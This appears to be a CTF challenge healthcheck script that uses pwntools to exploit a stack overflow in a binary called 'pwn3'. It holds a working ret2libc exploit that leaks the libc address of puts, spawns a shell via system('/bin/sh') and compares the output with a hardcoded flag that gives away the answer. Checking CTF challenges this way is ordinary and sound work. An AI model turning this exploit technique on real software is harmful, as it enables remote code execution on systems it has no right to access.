#!/usr/bin/env python3
from pwn import *
import argparse

def solve(host, port=9003):
	def send_payload(r, payload):
		r.recvuntil(b"sequence:\n")
		r.sendline(payload)
		r.recvuntil(b"sequence:\n")
		r.sendline(b"junk")
		r.recvline() # The hamming distance between ...
	
	try:
		context.log_level = 'error' # silent
		elf = context.binary = ELF("dist/pwn3")
		libc = ELF("dist/libc.so.6")

		flag = 'flag{R3turn-0r13nT3d-pwn1ng}'
		p = remote(host, port, timeout=10)

		# use `pwn cyclic 300`, feed into needle, then feed the crashed eip address into `pwn cyclic -l <address>`
		offset = 280


		rop = ROP(elf)
		rop.call(elf.symbols['puts'], [elf.got['puts']]) # puts(&puts)
		rop.call(elf.symbols['hammingDistance'])
		send_payload(p, b"A" * offset + rop.chain())
		puts = u64(p.recvline().rstrip().ljust(8, b"\x00"))
		log.info(f"puts found at {hex(puts)}")

		libc.address = puts - libc.symbols['puts']
		log.info(f"libc base found at {hex(libc.address)}")

		rop = ROP(libc)
		rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])
		rop.call(libc.symbols['exit'])
		send_payload(p, b"A"*offset + p64(rop.ret.address) + rop.chain())
		p.sendline(b"cat flag")
		r = p.recvline().decode("utf-8").strip()
	except:
		return False

	if r != flag:
		return False
	else:
		return True

if __name__=='__main__':
	parser = argparse.ArgumentParser(description='Healthcheck')
	parser.add_argument('--connection-info', help='Either in the format `nc <host> <port>` or `http[s]://host[:port]`', required=True)
	args = parser.parse_args()
	conn = args.connection_info
	if conn[:3] == "nc ":
		_, host, port = conn.split(' ')
	elif conn[:5] == "http":
		target = conn
	ok = solve(host, port)
	if ok:
		print("pwn3 is good")
		exit(0)
	else:
		print("pwn3 is bad")
		exit(1)

